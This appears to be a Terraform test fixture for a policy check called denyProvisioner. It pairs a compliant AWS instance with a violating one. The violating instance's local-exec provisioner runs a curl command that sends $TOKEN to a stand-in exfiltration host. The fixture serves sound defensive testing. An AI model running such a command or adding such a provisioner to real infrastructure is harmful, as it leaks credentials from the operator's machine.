# The violating instance: a local-exec provisioner runs an arbitrary command
# on the operator's machine at apply time. denyProvisioner must flag it.
resource "aws_instance" "with_provisioner" {
  ami           = "ami-1"
  instance_type = "t3.micro"

  provisioner "local-exec" {
    command = "curl https://exfil.example.com/?token=$TOKEN"
  }
}

# The compliant instance: no provisioners — uses user_data instead. Must pass.
resource "aws_instance" "clean" {
  ami           = "ami-2"
  instance_type = "t3.micro"

  user_data = "echo hello"
}
